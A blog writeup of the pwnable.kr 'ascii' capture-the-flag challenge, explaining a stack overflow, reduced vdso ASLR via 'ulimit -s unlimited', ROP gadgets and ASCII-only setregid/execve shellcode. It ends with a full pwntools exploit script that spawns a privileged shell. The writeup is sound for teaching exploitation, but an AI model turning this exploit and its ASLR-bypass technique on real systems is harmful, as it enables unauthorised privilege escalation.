---
layout: post
title:  Pwnable.kr - ascii
categories: [pwnable.kr]
excerpt: Writeup for ascii.
---
# Pwnable.kr - Ascii

The challenge can be found [here](http://pwnable.kr/play.php).

Without at least an attempt at the challenge, this writeup will probably not make much sense.
This is done to keep at least somewhat in the spirit of pwnable.kr style writeups.

# Initial Insights

Upon just running the program, it appears like we take in some data and trigger some bug.
For example:
```
Input text : asdfasfs
triggering bug...
```

We can really quickly verify a buffer overflow using the following:
```
my@pc:~/pwnablekr/ascii$ python3 -c "print('a' * 1000)" | ./ascii
Input text : triggering bug...
Segmentation fault (core dumped)
```

Okay, so we at least have a general idea of what we probably have to do; overwrite the return pointer to some shellcode, and execute it.

This probably means either ROP or stack leak -> shellcode -> ret to stack.

In order for the latter to be the route, we need NX disabled; a quick `checksec` verification shows that this is not the case:
```
[*] '/home/alexsieusahai/pwnablekr/ascii/ascii'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

# Defining The Attack Surface

We can pop the elf into ghidra, and quickly see that any input that is not ascii will be ignored and consequently stop the ingestion of the data.

Very importantly, however, we actually do ingest that one byte that's not ascii, possibly as an error made on the part of the challenge writer (due to the name `ascii` implying exclusively ascii shellcode).

Moreover, we can see in the disassembly of `vuln`, which is called after input ingestion in `main`, ends up copying our shellcode from the stack to `0x80000000`; we probably then have to RET to that location.

Note here that our buffer size is `0xac` and we ingest a maximum of `0x400` bytes, so our shellcode should be less than `0xac` bytes, with (consequently) a huge allownace for the ropchain of over `0x300` bytes.

With that in mind, we need to somehow include `0x80000000` onto our stack. Clearly, this is an issue due to that number not being within ascii range.

So, a natural next thing to check is whether or not this value exists in our stack somewhere. 
This is actually immediately true due to `0x80000000` being within a local variable within our `vuln` stack frame, due to `0x80000000` being used as an argument into `strcpy` (which is what `vuln` uses to copy the input data from the stack into `0x80000000`).
Note that this is only a direct consequence assuming the `i386` arch, due to function calling conventions (we push arguments onto the stack).

In particular, we can peek at the stack right before `ret` in `vuln` to see how many bytes we have to move `esp` up by:
```
(gdb) x/40x $esp
0xff80f71c:     0x55615b59      0x47474747      0x47474747      0x47474747
0xff80f72c:     0x55615b59      0x47474747      0x47474747      0x47474747
0xff80f73c:     0x55615b5a      0x47474747      0x0000009d      0x80000000
0xff80f74c:     0x000000d5      0x00000000      0x00000000      0x08049640
0xff80f75c:     0x08049156      0x00000001      0xff80f7e4      0xff80f7ec
0xff80f76c:     0x00000000      0x00000000      0x00000000      0x080496e0
0xff80f77c:     0x08049640      0x01eec1ff      0x09222810      0x00000000
0xff80f78c:     0x00000000      0x00000000      0x00000000      0x00000000
0xff80f79c:     0x217cc000      0x00000000      0x00000000      0x00000000
0xff80f7ac:     0x00000000      0x00000001      0x00000000      0x00000000
```

Okay, so we have a little bit more information about what constraints our ROPchain; we have to move `esp` up 44 bytes so that it points at `0x80000000`, then finally `RET` to that location.

However, in order to do that, we need to have some code which we can ROP onto.

A natural next thing to check out is the procmap of the function at this point:

```
(gdb) b *main
Breakpoint 1 at 0x8048f0e
(gdb) r
Starting program: /home/ascii/ascii 
(gdb) i proc m
process 262057
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x80ed000    0xa5000        0x0 /home/ascii/ascii
         0x80ed000  0x80ef000     0x2000    0xa5000 /home/ascii/ascii
         0x80ef000  0x80f1000     0x2000        0x0 
         0x926a000  0x928c000    0x22000        0x0 [heap]
        0xf76ff000 0xf7702000     0x3000        0x0 [vvar]
        0xf7702000 0xf7703000     0x1000        0x0 [vdso]
        0xff8e1000 0xff902000    0x21000        0x0 [stack]

```

All's great, but we need information about what pages are executable:

```
ascii@pwnable:/home/ascii cat /proc/262057/maps
08048000-080ed000 r-xp 00000000 103:00 23593832                          /home/ascii/ascii
080ed000-080ef000 rw-p 000a5000 103:00 23593832                          /home/ascii/ascii
080ef000-080f1000 rw-p 00000000 00:00 0 
0926a000-0928c000 rw-p 00000000 00:00 0                                  [heap]
f76ff000-f7702000 r--p 00000000 00:00 0                                  [vvar]
f7702000-f7703000 r-xp 00000000 00:00 0                                  [vdso]
ff8e1000-ff902000 rw-p 00000000 00:00 0                                  [stack]

```

Okay, so we have (possibly):  
+ The code section of `ascii`  
+ vdso (?) 

The first one is definitely a no-go because of PIE being disabled, so we're going to have to look into vdso.

# What is vdso and how do we constrain its possible living spaces?

[This is worth at least a skim for context](https://man7.org/linux/man-pages/man7/vdso.7.html).

Okay, so we know that this gets loaded into memory somewhere.
In order for that to be true, we can safely assume that this gets `mmap`ed somewhere into memory.

Upon multiple runs it seems like it always sits right below the allowed area for the stack.

Upon a good bit of googling around for how mmap achieves its randomization, I found [this](https://www.exploit-db.com/exploits/39669).
Importantly, look at this snippet

```
@@ -116,7 +104,7 @@ void arch_pick_mmap_layout(struct mm_struct *mm)
    if (current->flags & PF_RANDOMIZE)
        random_factor = arch_mmap_rnd();
 
-   mm->mmap_legacy_base = mmap_legacy_base(random_factor);
+   mm->mmap_legacy_base = TASK_UNMAPPED_BASE + random_factor;
 
    if (mmap_is_legacy()) {
        mm->mmap_base = mm->mmap_legacy_base;
```

We can really quickly google for the source code to [find](https://elixir.bootlin.com/linux/v4.4/source/arch/x86/mm/mmap.c#L68):

```c
unsigned long arch_mmap_rnd(void)
{
	unsigned long rnd;

	/*
	 *  8 bits of randomness in 32bit mmaps, 20 address space bits
	 * 28 bits of randomness in 64bit mmaps, 40 address space bits
	 */
	if (mmap_is_ia32())
		rnd = (unsigned long)get_random_int() % (1<<8);
	else
		rnd = (unsigned long)get_random_int() % (1<<28);

	return rnd << PAGE_SHIFT;
```

Importantly, this is only 8 bits of randomness!
So, we can achieve "good" alignment in an expected amount of `2^8 = 256` attempts!

So, if we can control the base location of `mmap` for VDSO, we have a way to beat ASLR!

A lot more googling around leads me to [this](http://security.cs.pub.ro/hexcellents/wiki/kb/exploiting/home); if we can set `RLIMIT_STACK` to `RLIM_INFINITY`, we can enable this `mmap_legacy` function and abuse this lower randomness `mmap` function in order to solve this problem.

[This ends up being very useful](https://www.gnu.org/software/libc/manual/html_node/Limits-on-Resources.html); in particular the idea that "each process initially inherits its limit values from its parent, but it can subsequently change them".
In particular, if we can modify the stack limit on the bash process which then spawns the `ascii` binary via `pwn.process`, the `ascii` binary will inherit the values from the parent bash process!

More googling around [leads me to this](https://stackoverflow.com/questions/13245019/how-to-change-the-stack-size-using-ulimit-or-per-process-on-mac-os-x-for-a-c-or); I'm not on `osx` but `man ulimit` leads me to `man bash` which verifies this to be true.
In particular, we find the `unlimited` keyword, which (hopefully) is effectively `RLIM_INFINITY`.

The only thing, now, is what `TASK_UNMAPPED_BASE` is. [This explanation of memory layouts in x86_32](https://utcc.utoronto.ca/~cks/space/blog/linux/32BitProcessMemoryLayout) ends up giving us what we need.
`TASK_UNMAPPED_BASE` sits right below the soft limit, so `unlimited` effectively describes the maximum amount that we can reduce our stacksize by.

We can see what this lower limit is by just simply
```
ascii@pwnable:~$ ulimit -s unlimited
ascii@pwnable:~$ gdb ascii
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ascii...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x8048f0e
(gdb) r
Starting program: /home/ascii/ascii 

Breakpoint 1, 0x08048f0e in main ()
(gdb) i proc m
process 116251
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x80ed000    0xa5000        0x0 /home/ascii/ascii
         0x80ed000  0x80ef000     0x2000    0xa5000 /home/ascii/ascii
         0x80ef000  0x80f1000     0x2000        0x0 
         0x883c000  0x885e000    0x22000        0x0 [heap]
        0x5556d000 0x55570000     0x3000        0x0 [vvar]
        0x55570000 0x55571000     0x1000        0x0 [vdso]
        0xffdac000 0xffdcd000    0x21000        0x0 [stack]
(gdb) 
```

Luckily, `vdso` sits somewhere that's already in ascii space, considering the last 3 bytes are used to direct our ROPchain to certain gadgets!

Note that, assuming a uniform random distribution over the possible spaces (which we can verify by looking at the random number generation algorithm underlying the value) we can just pick an arbitrary `vdso` start value from one run and just use that.

# Finding Applicable ROPgadgets

This is surprisingly, refreshingly easy to do, after the rabbit hole that was the last section, with `ROPgadget`:
This assumes the same `gdb` state as above, importantly that the vdso is loaded into memory at the same locations as above:
```
(gdb) dump memory /tmp/obfuscated/vdso 0x55570000 0x55571000
```
```
ascii@pwnable:/tmp/alexsieusahai$ ROPgadget --binary vdso | grep pop
0x000006fb : adc al, 0x31 ; rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret
0x000007e6 : adc al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x000007e4 : add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x000006f9 : add esp, 0x14 ; xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x00000a46 : arpl word ptr [ebx + 0x5e5b14c4], ax ; pop edi ; pop ebp ; ret
0x0000068d : cmp eax, ecx ; ja 0x690 ; mov eax, ecx ; pop ebx ; pop ebp ; ret
0x0000068f : ja 0x68e ; mov eax, ecx ; pop ebx ; pop ebp ; ret
0x00000684 : jb 0x699 ; jbe 0x695 ; mov edx, ebx ; pop ebx ; pop ebp ; ret
0x00000686 : jbe 0x693 ; mov edx, ebx ; pop ebx ; pop ebp ; ret
0x00000b01 : je 0xb0b ; mov dword ptr [edx], ecx ; pop ebx ; pop ebp ; ret
0x00000a45 : jne 0xab3 ; add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x000007e5 : les edx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x000006fa : les edx, ptr [ecx + esi] ; rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret
0x00000b03 : mov dword ptr [edx], ecx ; pop ebx ; pop ebp ; ret
0x00000aff : mov eax, ecx ; je 0xb0d ; mov dword ptr [edx], ecx ; pop ebx ; pop ebp ; ret
0x00000691 : mov eax, ecx ; pop ebx ; pop ebp ; ret
0x000007e2 : mov ebx, edx ; add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x00000688 : mov edx, ebx ; pop ebx ; pop ebp ; ret
0x00000b2d : nop ; nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
0x00000b2e : nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
0x00000b2f : nop ; pop eax ; mov eax, 0x77 ; int 0x80
0x00000685 : or esi, dword ptr [esi + 5] ; mov edx, ebx ; pop ebx ; pop ebp ; ret
0x00000b30 : pop eax ; mov eax, 0x77 ; int 0x80
0x00000b59 : pop ebp ; pop edx ; pop ecx ; ret
0x0000068b : pop ebp ; ret
0x0000068a : pop ebx ; pop ebp ; ret
0x000006fe : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x00000b5b : pop ecx ; ret
0x00000700 : pop edi ; pop ebp ; ret
0x00000b5a : pop edx ; pop ecx ; ret
0x000006ff : pop esi ; pop edi ; pop ebp ; ret
0x000006fd : rcr byte ptr [ebx + 0x5e], 0x5f ; pop ebp ; ret
0x000007e3 : rol dword ptr [ebx + 0x5e5b14c4], cl ; pop edi ; pop ebp ; ret
0x00000683 : sal dword ptr [edx + 0xb], cl ; jbe 0x696 ; mov edx, ebx ; pop ebx ; pop ebp ; ret
0x000006fc : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
```

We can narrow this down manually, first removing any where the last two bytes aren't in ascii range (`0x20-0x7f` inclusive):

```
0x00000a46 : arpl word ptr [ebx + 0x5e5b14c4], ax ; pop edi ; pop ebp ; ret
0x00000a45 : jne 0xab3 ; add esp, 0x14 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x00000691 : mov eax, ecx ; pop ebx ; pop ebp ; ret
0x00000b2d : nop ; nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
0x00000b2e : nop ; nop ; pop eax ; mov eax, 0x77 ; int 0x80
0x00000b2f : nop ; pop eax ; mov eax, 0x77 ; int 0x80
0x00000b30 : pop eax ; mov eax, 0x77 ; int 0x80
0x00000b59 : pop ebp ; pop edx ; pop ecx ; ret
0x00000b5b : pop ecx ; ret
0x00000b5a : pop edx ; pop ecx ; ret
0x00000683 : sal dword ptr [edx + 0xb], cl ; jbe 0x696 ; mov edx, ebx ; pop ebx ; pop ebp ; ret
```

In particular, these two instructions look attractive:
```
0x00000b59 : pop ebp ; pop edx ; pop ecx ; ret
0x00000b5a : pop edx ; pop ecx ; ret
```

We can do the first instruction at `0xb59` twice in order to pop 8 items off the stack, then finally use the second instruction at `0xb5a` to pop 3 items off the stack, putting `0x80000000` at the top of the stack (and thus this will be what we end up `ret`ing to).

# Ascii shellcode?

## High level goal

[This seems like a great intro to ascii shellcoding](https://nets.ec/Ascii_shellcode), and it was what I used to quickly get up to speed.

I spent a lot of time on an `open -> sendfile` type of shellcode but I couldn't get it to work when I was using the actual flag file, for unknown reasons.
In particular it seemed really hard in general to get output from the process before death, in which I'm (for reasons I don't understand, yet) not able to read the output.
So, there's probably an `open -> sendfile` type solution that exists if you're careful about output handling somehow, or possibly by crafting an `exit` syscall after the `sendfile`, but I wasn't able to find it.

Our general gameplan is going to be:
+ Elevate the privileges of any spawned processes to be able to read the flag
+ Pop a shell

Looking at the flag and executable perms:
```
ascii@pwnable:~$ ls -l
total 740
-r-xr-sr-x 1 root ascii_pwn 749493 Aug  6  2014 ascii
-r--r----- 1 root ascii_pwn     54 Aug  6  2014 flag
-r--r----- 1 root ascii_pwn    214 Oct 31  2016 intended_solution.txt
```
We have to `setregid` our process in order to have our spawned shell to inherit `rgid` and `egid` from the `current_task_struct`, followed by an `execve("/bin/sh", NULL, NULL)` call.

We can quickly look at `/etc/group` in order to determine what value `setregid` must take:
```
ascii@pwnable:~$ cat /etc/group | grep ascii
ascii_easy:x:1040:
ascii_easy_pwn:x:1041:
ascii:x:1042:
ascii_pwn:x:1043:
```

So, we have to craft a shell that will execute
```
setregid(1043, 1043)
execve(?, 0, 0)
```

## Solving major problems for porting the shellcode to ascii shellcode

If we look at [this syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md), we can see that `execve` has number `11` and `setregid` has number `71`.

So, in x86_32 assembler, this would look like
```
mov eax, 71
mov ebx, 1043
mov ecx, 1043
int 0x80 

mov eax, 11
push hs//
push nib/
mov ebx, esp
mov ecx, 0
mov edx, 0
int 0x80
```

We need analogous primitives that give us something similar.

Thankfully, that link above solves a lot of the problems for us.
We have access to `push, pop, inc, dec` for all registers, and `xor al, some_byte`.
In particular, we can get something like `mov` for one byte just by doing
```
push 0x20
pop eax
xor al, 0x20

xor al, desired_byte
push eax
pop desired_register
```

What is this doing?
Firstly, we `push 0x20` onto the stack and `pop eax`, in order to set `eax` to `0x20`.
Then, `xor al, 0x20` makes the `al` register equal to `0`!
Then, since `xor 0, x = x`, we have a simple way to `mov` a byte into `eax`.
Finally, we use `push eax` followed by `pop desired_register` in order to get the desired value into our desired register.

This is great news, as we solve all of the `mov`s above, except for the instructions involving `1043`, which is two bytes.

We can also borrow the solution for `int 0x80` in the above article in order to solve the two `int 0x80` instructions.

Before we do this, however, we definitely need some domain specific numbers, as `0x80000000` is not ascii.

We can take a look at what our registers are after we finish this ROPchain:

```
(gdb) i r
eax            0xffbbb310       -4476144
ecx            0x9d     157
edx            0x47474747       1195853639
ebx            0x800000d4       -2147483436
esp            0xffbbb3ec       0xffbbb3ec
ebp            0x47474747       0x47474747
esi            0x0      0
edi            0x80496e0        134518496
eip            0x80000000       0x80000000
```

In particular, `ebx` points to the end of our input, and we can certainly manipulate this to get what we need!
Also, `ecx` contains the value of the last character that we ingested; for example, in this sample payload that I used to get here, I arbitrarily chose to use `\x9d`, allowing us to put `0x9d` into our registers for easy use!
I didn't personally end up using this, but this could make our shellcode smaller.
Additionally, remember that earlier, we discovered from reverse engineering that the program actually stores one non-ascii byte, followed by what appears to be always zeroes (I believe it's due to an mmap flag and/or oddity but I never looked into it); we can symlink all bytes to point to `/bin/sh` in order to easily conquer the `ebx` register setup for `execve`!

We can use `G = 0x47` as our nop byte, and massage where exactly we place `int 0x80; nop; nop = 0x909080cd` by `xor`ing some values with `0x47474747`.
Note that `G` corresponds to the instruction of `inc edi`; we will ignore using `edi` if possible going further.

We will assume (and massage our values of `eax`) so that `[eax] = 0x47474747`.

So, we need to `xor` `0x47474747` with some value so that `0x47474747 ^ some_value = 0x909080cd`.
0ue to properties of `xor` (in paritcular associativity and the fact that `xor(x, x) = 0` and `xor(x, 0) = x` for all x), we then have that
```
0x47474747 ^ some_value = 0x909080cd
some_value = 0x909080cd ^ 0x47474747
some_value = 0xd7d7c78a
```

Only, there's a problem; this value isn't in ascii space!
Thankfully, there's an easy remedy here, with the following:
```
push 0x20
pop eax
xor al, 0x20
dec eax
```

This makes our value of `eax = 0xffffffff`, and so we then want to find `x` so that
```
x ^ 0xffffffff = 0xd7d7c78a
x = 0xd7d7c78a ^ 0xffffffff
x = 0x28283875
```

So, this finally gives us a way to get the value we need!
We'll store it in `esi`, mainly because we won't have any use for `esi` later.
To summarize:

```
push 0x20
pop eax
xor al, 0x20
dec eax
xor eax, 0x28283875
push eax
pop esi
```
Now, finally, we just have to manipulate `eax` so that we place the syscalls far enough apart so that we have space for our shellcode.
Note that this massive space for the syscall is unnecessary and was mainly used as huge scratch space for figuring out the syscalls individually; mainly an artifact.
Note that this assumes a payload size of `0xd4`, and for differing payload sizes different constants would have to be used.
```
push ebx
pop eax
xor al, 0x72
xor [eax], esi
xor al, 0x26
xor [eax], esi
```

## Solving remaining minor problems and putting the shellcode together

Initially, we do the syscall setup.

```
push ebx
push 0x20
pop eax
xor al, 0x20
dec eax
xor eax, 0x28283875
push eax
pop esi

push ebx
pop eax
xor al, 0x72
xor [eax], esi
xor al, 0x26
xor [eax], esi
```

We `push ebx` to store the pointer to the end of the supplied payload, so we can use that in `execve` and just point the byte in question to `/bin/sh` with a symlink.

Now, we have to setup `setregid`, and consequently solve our last problem.

Thankfully, this solution is very minor; we simply want `0x413 = 1043` in `eax`, which we can easily do if we start with `0x47474747` in `eax`:
```
push 0x20
pop eax
xor al, 0x20
xor eax, 0x47474747
xor eax, 0x47474354
push eax
pop ebx
```
I'll save you the xor explanation as it's more or less a carbon copy of the previous xor constant finding.

Lastly, we also need `ecx` to have the same value of `ebx`, which ends up also being nothing surprising:

```
push ebx
pop ecx
```

Finally, we just setup `eax` to be `0x47 = 71`:
```
push 0x20
pop eax
xor al, 0x20
xor al, 0x47
```
Note again that this is lazy; there's certainly smaller shellcode here just by being more careful with your xor choice.

I placed my first `int 0x80` at `0x8e`, so we'll just forward fill until `0x92`:

```python
shellcode = setregid_shellcode
shellcode += 'G' * (0x92 - len(shellcode))
```

The `execve` shellcode is very similar (recall that we stored `ebx` earlier):

```
pop ebx

push 0x20
pop eax
xor al, 0x20
push eax
pop ecx

push eax
pop edx

xor al, 0x2b
xor al, 0x20
```

This will setup and run our `execve` call once we walk upon the `int 0x80; nop; nop` shellcode we created sometime in the future, using `inc edi` style nops to walk to that point, now giving us our full shellcode.


## Tips for debugging

Something important to note is that we seem to only be able to use `gdb` on files that we own with pwntools, so if we do something like
```
cp /home/ascii/ascii /tmp/mydir/ascii_mine
```
We can get something that we can easily debug with pwntools.
Additionally, we can read the `procmap` for `ascii_mine`, allowing us to find the `vdso` offsets at runtime and generate a payload that (should) hit perfectly, mainly debugging comparatively painless.

Additionally, since it takes some time to ingest the payload, batching processes is a very time efficient way to see if your solution works on the true binary; if we don't get the solution in say, 1000 attempts, something is probably wrong (as we'd expect to get it within 256 attempts with reasonable variance).

## The full solution

This is certainly not the cleanest solution, but hopefully with the previous explanation it makes sense at least somewhat:

```python
import time
import os
from sys import exit
from pwn import *

context.arch, context.os = 'i386', 'linux'

VDSO_START = 0x55606000
DEBUG = True
GDB = True

def setup_symlinks(filename):
    for i in range(1, 256):
        i = chr(i)
        if i == '.' or i == '/':
            continue
        try:
            os.remove(i)
        except OSError:
            print(i, 'failed to remove')
            pass
        os.symlink(filename, i)
        print('made symlink for', i)

setup_symlinks("/bin/sh")

def is_ascii(c):
    c = ord(c)
    return c >= 0x20 and c <= 0x7f

zero_out_eax = asm('''
push 0x20
pop eax
xor al, 0x20
''')

setup_int_0x80 = zero_out_eax + asm('''
dec eax
xor eax, 0x28283875
push eax
pop esi

push ebx
pop eax
xor al, 0x72
xor [eax], esi
xor al, 0x26
xor [eax], esi
''')
setup setregid(1043, 1043)
setup_ebx = zero_out_eax + asm('''
xor eax, 0x47474747
xor eax, 0x47474354

push ebx
push eax
pop ebx
''')
setup_ecx = asm('push ebx\npop ecx')
setup_eax = zero_out_eax + asm('xor al, 0x47')
setregid_shellcode = setup_int_0x80 + setup_ebx + setup_ecx + setup_eax

# setup execve(some_bytes, NULL, NULL)
setup_ebx = asm('pop ebx')  # pop off the value we stored
setup_ecx = zero_out_eax + asm('push eax\npop ecx')
setup_edx = asm('push eax\npop edx')
setup_eax = asm('xor al, 0x2b') + asm('xor al, 0x20')
execve_shellcode = setup_ebx + setup_ecx + setup_edx + setup_eax

shellcode = setregid_shellcode
shellcode += 'G' * (0x92 - len(shellcode))
shellcode += execve_shellcode
assert all(map(is_ascii, shellcode))

def gen_payload(vdso_start=None):
    """
    generates payload on the fly for easy DEBUG style testing
    """
    if vdso_start is None:
        vdso_start = VDSO_START
    two_pop_ret = p32(vdso_start + 0xb5a) + b'GGGG'  # pops 3 things off stack
    three_pop_ret = p32(vdso_start + 0xb59) + b'GGGG' * 3  # pops 4 things off stack
    payload = shellcode + b'G' * (0xac - len(shellcode))
    payload += three_pop_ret + three_pop_ret + two_pop_ret
    assert all(map(is_ascii, payload))
    assert len(payload) < 0xac + 44
    return payload

for i in range(1 if DEBUG else 20):
    howmany = 0
    if DEBUG:
        while True:
            p = process('./ascii_mine')
            procq = [p]
            vdso_start = None
            with open('/proc/' + str(p.pid) + '/maps') as f:
                maps = f.read()
            print(maps)
            vdso_start = next(iter(filter(lambda x: 'vdso' in x, maps.split('\n'))))
            vdso_start = eval('0x' + vdso_start.split('-')[0])
            try:
                payload = gen_payload(vdso_start)
                break
            except AssertionError as e:
                print('trying again...' + str(howmany))
                howmany += 1
                p.close()
                continue
    else:
        procq = [process('ascii') for _ in range(100)]

    if DEBUG:
        if GDB:
            gdb.attach(p, gdbscript='''
            display/x $eax
            display/10i $eip
            b *0x8048f0d
            c
            b *0x80000000
            ''')
            payload += b'\x9d'
            p.send(payload)
            raw_input('waiting for input...')
        else:
            p.send(payload)
    else:
        for p in procq:
            payload = gen_payload(VDSO_START)
            payload += b'\x9d'
            p.send(payload)

    for p in procq:
        if p.poll() is None:
            print('got one!')
            p.interactive()
            exit(0)
        p.close()
```
